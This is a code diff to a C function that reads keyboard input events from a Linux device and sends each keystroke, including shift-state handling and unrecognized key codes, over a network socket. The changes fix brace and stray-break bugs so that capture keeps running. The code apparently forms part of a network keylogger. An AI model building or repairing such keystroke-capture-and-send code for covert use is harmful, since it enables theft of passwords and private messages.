@@ -159,12 +159,13 @@ void print(int fd, int socket_fd) {
         }
 
         if (ie.code == KEY_LEFTSHIFT || ie.code == KEY_RIGHTSHIFT) {
-            if (ie.value == 1)
+            if (ie.value == 1) {
                 shift_down = true;
                 continue;
-            else if (ie.value == 0)
+            } else if (ie.value == 0) {
                 shift_down = false;
                 continue;
+            }
         }
 
         if (ie.value != 1)
@@ -173,10 +174,8 @@ void print(int fd, int socket_fd) {
         if (ie.code >= 2 && ie.code <= 10) {
             len = snprintf(buffer, sizeof(buffer), "%d", ie.code -1);
             n = send(socket_fd, buffer, len, 0);
-            break;
         } else if (ie.code == 11) {
             n = send(socket_fd, "0", 1, 0);
-            break;
         } else {
 
             switch (ie.code) {
@@ -215,8 +214,7 @@ void print(int fd, int socket_fd) {
                             break;
                         }
                     }
-                    if (!good && (ie.code != KEY_LEFTSHIFT) && (ie.code != KEY_RIGHTSHIFT)
-                        && (ie.code != KEY_CAPSLOCK)) {
+                    if (!good) {
 
                         len = snprintf(buffer, sizeof(buffer), "code:%d", ie.code);
                         n = send(socket_fd, buffer, len, 0);
